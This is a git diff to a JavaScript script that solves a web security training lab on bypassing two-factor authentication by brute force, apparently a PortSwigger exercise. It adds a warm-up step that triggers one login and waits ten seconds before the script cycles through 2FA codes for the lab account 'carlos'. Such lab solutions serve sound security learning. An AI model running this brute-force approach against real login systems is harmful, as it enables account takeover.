@@ -1,6 +1,7 @@
 import { getParsedInput } from "../../../utils/getParsedInput.js";
 import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";
 import { runTasks } from "../../../utils/runTasks.js";
+import { sleep } from "../../../utils/sleep.js";
 
 const { url, concurrencyLimit, httpClient } = getParsedInput({
   description: "Lab: 2FA bypass using a brute-force attack",
@@ -29,6 +30,8 @@ function extractCSRF(response) {
 }
 
 const creds = { username: "carlos", password: "montoya" };
+
+await initializeMFACode();
 
 async function task(index) {
   let response = await httpClient.get(url + "login");
@@ -79,6 +82,15 @@ async function task(index) {
     process.exit(0);
   }
   console.log(`${code}: fail`);
+}
+
+async function initializeMFACode() {
+  // Initialize the mfa code on the server side.
+  // Without this it may not work on the first try
+  console.log("Initializing the mfa code on the server side...");
+  await task(0);
+  await sleep(10_000);
+  console.log("Done!\n");
 }
 
 const tasks = [];
